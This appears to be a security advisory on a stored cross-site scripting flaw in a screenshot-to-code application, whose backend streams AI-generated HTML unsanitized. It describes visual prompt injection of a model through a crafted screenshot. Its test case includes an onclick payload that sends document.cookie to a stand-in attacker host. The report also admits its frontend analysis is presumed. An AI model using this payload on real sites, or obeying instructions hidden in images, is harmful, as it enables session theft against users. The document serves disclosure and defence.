## Vulnerability: Stored Cross-Site Scripting (XSS) via AI-Generated Code

### Description:
This vulnerability arises from the application's failure to sanitize or validate HTML, CSS, and JavaScript code generated by its AI model from user-uploaded screenshots or designs. An attacker can exploit this by crafting a malicious screenshot or design that subtly instructs the AI to embed a JavaScript payload into the generated code.

1.  **Malicious Input Creation:** A malicious attacker crafts a screenshot or design. This input is specifically designed to trick the AI model into generating HTML code that includes a Javascript payload. For example, the screenshot could visually represent a button, input field, or heading, but the underlying data is crafted to manipulate the AI into generating HTML with malicious Javascript code embedded within tags or attributes, or as inline `<script>` blocks.
2.  **Upload and Process:** The attacker uses the application's frontend to upload this malicious screenshot or design and initiates the code generation process. The frontend sends the screenshot to the backend for processing by the AI model.
3.  **AI Code Generation:** The backend of the application, utilizing an AI model (like GPT-4 Vision, Claude, Gemini), processes the uploaded image. Due to the crafted nature of the input, the AI model inadvertently generates HTML, CSS, and JavaScript code that contains the attacker's malicious Javascript payload.
4.  **Unsanitized Backend Output:** The backend returns this AI-generated code, including the malicious Javascript, to the frontend. Critically, the backend does not sanitize or validate the generated code to remove or neutralize any potentially harmful scripts. The code is directly streamed via websocket without any security checks.
5.  **Vulnerable Frontend Rendering:** The application's frontend receives the AI-generated code from the backend via websocket. Assuming the frontend renders this code directly into the DOM (Document Object Model) without proper output encoding or sanitization, or if a user copies the unsanitized code for use elsewhere, the malicious Javascript payload becomes part of an active web page.
6.  **XSS Execution:** When a user (either the attacker or, more likely, another unsuspecting user) views the part of the application where this AI-generated code is rendered, or if they implement the copied code into their own web application, the browser executes the embedded malicious Javascript code.
7.  **Stored XSS:** This execution of malicious Javascript within the user's browser constitutes a Stored Cross-Site Scripting (XSS) vulnerability. The attacker's script runs in the context of the user's session, allowing for various malicious actions.

### Impact:
Successful exploitation of this Stored Cross-Site Scripting (XSS) vulnerability can have severe consequences:

*   **Account compromise:** An attacker can potentially steal session cookies or other authentication tokens, gaining unauthorized access to the user's account within the application or any web application where the generated code is implemented.
*   **Data theft:** Malicious scripts can be designed to extract sensitive data accessible within the user's browser, including personal information, application data, or even data from other websites if the browser has cross-site scripting vulnerabilities.
*   **Malware distribution:** The XSS vulnerability can be used to redirect users to external websites hosting malware or to inject malware directly into the application, potentially infecting users' machines.
*   **Website defacement:** Attackers could alter the visual appearance or functionality of the web page as seen by other users, damaging the application's reputation and user trust.
*   **Session hijacking:** By stealing session identifiers, attackers can directly hijack user sessions, performing actions as if they were the legitimate user without needing their credentials.
*   **Further attacks:** Using the XSS vulnerability as a stepping stone for more complex attacks against the user or other users of the application.

### Vulnerability Rank: High

### Currently Implemented Mitigations:
Based on the provided code analysis, there are **no currently implemented mitigations** to address this XSS vulnerability.

*   **Backend Code:** Code analysis of the backend files (`backend\routes\evals.py`, `backend\routes\generate_code.py`, `backend\llm.py`, `backend\codegen\utils.py`) reveals no explicit sanitization or encoding of the AI-generated code before it is sent to the frontend or used in evaluation routes.
*   **Frontend Code:** There is no evidence of any output encoding or escaping being applied to the AI-generated code before rendering in the frontend from the provided backend files.
*   **Content Security Policy (CSP):** The project does not appear to implement a Content Security Policy (CSP) to restrict the execution of inline scripts or other potentially dangerous behaviors in the browser.

### Missing Mitigations:
To effectively mitigate this Stored XSS vulnerability, the following mitigations are crucial:

*   **Backend Sanitization:** Implement robust server-side sanitization of the AI-generated code within the backend, specifically in `backend\routes\generate_code.py` before sending code to the frontend. This process should:
    *   Parse the AI-generated HTML, CSS, and JavaScript code.
    *   Utilize a well-established HTML sanitization library (like DOMPurify for JavaScript backend or bleach for Python backend) to identify and neutralize potentially harmful Javascript code and HTML elements, such as `<script>` tags, inline event handlers (e.g., `onclick`), `javascript:` URLs, and potentially dangerous DOM manipulation functions.
    *   Re-serialize the sanitized code back into a string for transmission to the frontend.
*   **Frontend Output Encoding/Escaping:** The frontend must implement proper output encoding or escaping of the AI-generated code before rendering it in the browser's DOM. This ensures that any potentially malicious code that bypasses backend sanitization is treated as plain text and not executed as code. Using appropriate templating engines that provide automatic escaping or manually escaping HTML entities is crucial.
*   **Content Security Policy (CSP):** Implement a strict Content Security Policy (CSP) in the frontend application. A well-configured CSP can significantly reduce the impact of XSS attacks by preventing the execution of inline Javascript, restricting the sources from which scripts can be loaded, and controlling other potentially dangerous functionalities.
*   **Subresource Integrity (SRI):** If the AI-generated code includes references to external JavaScript libraries (e.g., from CDNs), implement Subresource Integrity (SRI) to ensure that the browser only executes scripts if the fetched file's content matches a known, trusted hash. This prevents attackers from tampering with CDN files to inject malicious code.
*   **User Awareness and Warnings:** Provide clear and prominent warnings to users in the frontend application about the potential security risks of directly using AI-generated code without careful review, sanitization, and testing. Encourage users to treat AI-generated code as a starting point and to perform thorough security reviews before deployment, especially emphasizing the risks of XSS vulnerabilities.
*   **Input Sanitization (Defense in Depth):** While the primary vulnerability is in output sanitization, consider implementing input validation and sanitization on the image processing side as a defense-in-depth measure. This could involve checks to detect and reject potentially malicious image formats or embedded data that might be designed to facilitate prompt injection attacks.

### Preconditions:
Several preconditions must be met for this vulnerability to be successfully exploited:

1.  **Malicious Input Creation:** An attacker needs to be able to craft a malicious screenshot or design that will successfully manipulate the AI model into generating Javascript code as part of its HTML output. This requires some understanding of how the AI model interprets visual inputs and translates them into code, or using techniques like visual prompt injection.
2.  **Vulnerable Backend Processing:** The backend must process the malicious input using an AI model susceptible to generating code with embedded malicious payloads and fail to sanitize the AI-generated output.
3.  **Vulnerable Frontend Rendering or User Action:** The frontend application must be vulnerable to directly rendering the unsanitized AI-generated code, most likely by using methods like `innerHTML` or similar DOM manipulation techniques without proper escaping. Alternatively, a user must copy and implement the unsanitized code into their own web application.
4.  **User Access to Vulnerable Content:** A user must access the part of the application where the malicious AI-generated code is rendered in order for the XSS payload to be executed in their browser. Or, in the case of user-implemented code, other users must visit the web application containing the malicious code.

### Source Code Analysis:
The source code analysis highlights the lack of sanitization in the backend, specifically in the code generation and processing pipeline.

1.  **`backend\llm.py`**: Functions like `stream_openai_response`, `stream_claude_response`, and `stream_gemini_response` interact with LLMs. The AI-generated code (`completion['code']`) is returned as a raw string **without any sanitization**.

    ```python
    async def stream_openai_response(
        messages: List[ChatCompletionMessageParam],
        api_key: str,
        base_url: str | None,
        callback: Callable[[str], Awaitable[None]],
        model: Llm,
    ) -> Completion:
        # ...
        stream = await client.chat.completions.create(**params)
        full_response = ""
        async for chunk in stream:
            content = chunk.choices[0].delta.content or ""
            full_response += content
            await callback(content)
        return {"duration": completion_time, "code": full_response} # No sanitization here
    ```

2.  **`backend\routes\generate_code.py`**: The `stream_code` websocket endpoint orchestrates code generation. It calls AI models and extracts HTML but performs **no sanitization** before sending the code to the frontend via websocket messages of type `setCode`.

    ```python
    @router.websocket("/generate-code")
    async def stream_code(websocket: WebSocket):
        await websocket.accept()
        # ...
        completions = await asyncio.gather(*tasks, return_exceptions=True)
        completions = [
            result["code"]
            for result in completions
            if not isinstance(result, BaseException)
        ]
        completions = [extract_html_content(completion) for completion in completions] # extract_html_content does not sanitize

        for index, updated_html in enumerate(updated_completions):
            await send_message("setCode", updated_html, index) # Unsanitized code sent to frontend
        await websocket.close()
    ```

3.  **`backend\codegen\utils.py`**: The `extract_html_content` function extracts HTML using regex but **does not perform sanitization**. It just extracts the HTML string as is.

    ```python
    def extract_html_content(text: str) -> str:
        """Extracts the HTML content from a string.
        """
        html_match = re.search(r"(<html.*?>.*?</html>)", text, re.DOTALL)
        if html_match:
            return html_match.group(1)
        return text
    ```

4.  **`backend\evals\core.py`**: Functions like `generate_code_for_image` also call LLM functions and return the generated code without sanitization.

    ```python
    async def generate_code_for_image(
        image_url: str,
        prompt_type: PromptType,
        llm_type: Llm,
        api_key: str | None,
        base_url: str | None,
    ) -> str:
        # ...
        completion = await stream_claude_response(...) # Calls LLM, no sanitization in stream_claude_response
        return completion["code"] # Returns unsanitized code
    ```

5.  **Frontend Code (Not Provided, but Likely Vulnerable):**  It is presumed that the frontend is designed to render the HTML code received from the backend. If the frontend uses methods like `innerHTML` or similar DOM manipulation APIs directly with the unsanitized HTML string, it will be vulnerable to XSS.

### Security Test Case:
This test case outlines steps to verify the Stored XSS vulnerability:

1.  **Precondition:** Ensure the application is running locally (`http://localhost:5173`).
2.  **Craft Malicious Screenshot:** Create an image visually representing a button with text designed to inject Javascript. For example, an image of a button with the text `<button onclick="alert('XSS-Test')">Click Me</button>`. Save as `xss_screenshot.png`.
3.  **Upload Malicious Screenshot:** In the application frontend, upload `xss_screenshot.png`.
4.  **Initiate Code Generation:** Select any stack and click "Generate Code".
5.  **Inspect Generated Code (Optional):** Use browser developer tools (Network tab) to intercept the API response and verify if the generated HTML code contains the malicious Javascript payload (e.g., `<button onclick="alert('XSS-Test')">Click Me</button>`).
6.  **Render and Execute XSS Payload:** Observe the rendered output in the frontend. If vulnerable, interacting with the generated element (e.g., clicking the button) should trigger the Javascript alert box "XSS-Test", confirming XSS execution.
7.  **Verify XSS Impact:** For a more impactful demonstration, modify the payload to perform more harmful actions instead of `alert()`, such as redirecting to an attacker's site or attempting to steal cookies. For example, use  `onclick="document.location='https://attacker.com/cookie-stealer?cookie='+document.cookie"`.

**Important Note:** Perform testing in a safe, isolated environment and never against a production system without explicit permission.
